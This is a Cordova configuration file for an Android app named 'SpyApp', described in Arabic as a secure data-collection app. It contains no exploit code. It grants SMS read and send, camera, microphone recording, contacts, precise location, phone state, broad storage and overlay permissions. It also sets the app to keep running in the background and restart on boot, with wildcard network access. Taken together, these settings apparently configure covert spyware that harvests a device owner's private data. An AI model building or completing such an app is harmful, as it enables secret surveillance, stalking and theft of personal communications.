<?xml version='1.0' encoding='utf-8'?>
<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
    <name>SpyApp</name>
    <description>تطبيق جمع البيانات الآمن</description>
    <author email="dev@example.com" href="http://example.com">SpyApp Developer</author>
    <content src="index.html" />
    <access origin="*" />
    <allow-intent href="http://*/*" />
    <allow-intent href="https://*/*" />
    <allow-intent href="tel:*" />
    <allow-intent href="sms:*" />
    <allow-intent href="mailto:*" />
    <allow-intent href="geo:*" />
    <preference name="loglevel" value="DEBUG" />
    <preference name="AndroidInsecureFileModeEnabled" value="true" />
    <preference name="AndroidExtraFileSystems" value="files,files-external,documents,sdcard,cache,cache-external,assets,root" />
    <preference name="ScrollEnabled" value="false" />
    <preference name="android-minSdkVersion" value="21" />
    <preference name="android-targetSdkVersion" value="34" />
    <preference name="BackupWebStorage" value="none" />
    <preference name="KeepRunning" value="true" />
    <preference name="LoadUrlTimeoutValue" value="60000" />

    <!-- إعدادات إضافية لضمان العمل الصحيح -->
    <preference name="AndroidPersistentFileLocation" value="Compatibility" />
    <preference name="AndroidExtraFileSystems" value="files,files-external,documents,sdcard,cache,cache-external,assets,root" />

    <!-- الإضافات (Plugins) - تم التصحيح -->
    <plugin name="cordova-plugin-whitelist" spec="1.3.5" />
    <plugin name="cordova-plugin-camera" spec="6.0.0" />
    <plugin name="cordova-plugin-sms" spec="1.0.5" />
    <plugin name="cordova-plugin-media-capture" spec="3.0.3" />
    <plugin name="cordova-plugin-contacts" spec="3.0.1" />
    <plugin name="cordova-plugin-file" spec="7.0.0" />
    <plugin name="cordova-plugin-file-transfer" spec="2.0.0" />
    <plugin name="cordova-plugin-geolocation" spec="4.1.0" />
    <plugin name="cordova-plugin-android-permissions" spec="1.1.3" />
    <plugin name="cordova-plugin-media" spec="5.0.3" />
    <plugin name="cordova-plugin-background-mode" spec="0.7.3" />

    <platform name="android">
        <!-- تأكيد تثبيت الأذونات بشكل صحيح -->
        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
            <manifest xmlns:android="http://schemas.android.com/apk/res/android">
                <!-- الأذونات الأساسية -->
                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
                <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
                
                <!-- أذونات SMS -->
                <uses-permission android:name="android.permission.SEND_SMS" />
                <uses-permission android:name="android.permission.RECEIVE_SMS" />
                <uses-permission android:name="android.permission.READ_SMS" />
                <uses-permission android:name="android.permission.RECEIVE_MMS" />
                
                <!-- أذونات الكاميرا والميكروفون -->
                <uses-permission android:name="android.permission.CAMERA" />
                <uses-permission android:name="android.permission.RECORD_AUDIO" />
                <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
                
                <!-- أذونات جهات الاتصال -->
                <uses-permission android:name="android.permission.READ_CONTACTS" />
                <uses-permission android:name="android.permission.WRITE_CONTACTS" />
                
                <!-- أذونات إضافية مهمة -->
                <uses-permission android:name="android.permission.INTERNET" />
                <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
                <uses-permission android:name="android.permission.WAKE_LOCK" />
                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
                <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
                <uses-permission android:name="android.permission.READ_PHONE_STATE" />
                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
                
                <!-- إعدادات خاصة لـ Android 10+ -->
                <application android:requestLegacyExternalStorage="true">
                    <service android:name="de.appplant.cordova.plugin.backgroundmode.BackgroundModeService" />
                    <receiver android:name="de.appplant.cordova.plugin.backgroundmode.RestartReceiver" android:enabled="true">
                        <intent-filter>
                            <action android:name="android.intent.action.BOOT_COMPLETED" />
                        </intent-filter>
                    </receiver>
                </application>
            </manifest>
        </edit-config>
        
        <!-- إعدادات إضافية لضمان توافق Android 11+ -->
        <config-file parent="queries" target="AndroidManifest.xml">
            <intent>
                <action android:name="android.intent.action.VIEW" />
                <data android:mimeType="*/*" />
            </intent>
        </config-file>
    </platform>
</widget>
